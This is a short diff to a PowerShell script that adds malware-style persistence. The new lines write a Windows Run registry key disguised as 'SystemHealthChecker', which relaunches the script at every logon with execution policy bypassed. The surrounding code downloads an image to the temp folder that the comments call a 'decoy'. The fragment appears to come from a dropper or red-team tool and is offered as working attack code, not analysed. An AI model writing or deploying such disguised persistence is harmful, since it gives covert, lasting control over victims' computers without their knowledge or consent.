@@ -1,4 +1,11 @@
 try {
+    # Establish persistence via Registry (Run Key)
+    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    $regName = "SystemHealthChecker"
+    $regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`""
+    Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
+    Write-Host "[+] Persistence established via Registry."
+
     # Download the image (decoy)
     $imageUrl = "https://png.pngtree.com/png-vector/20191121/ourmid/pngtree-blue-bird-vector-or-color-illustration-png-image_2013004.jpg"
     $imagePath = "$env:TEMP\blue-bird.jpg"
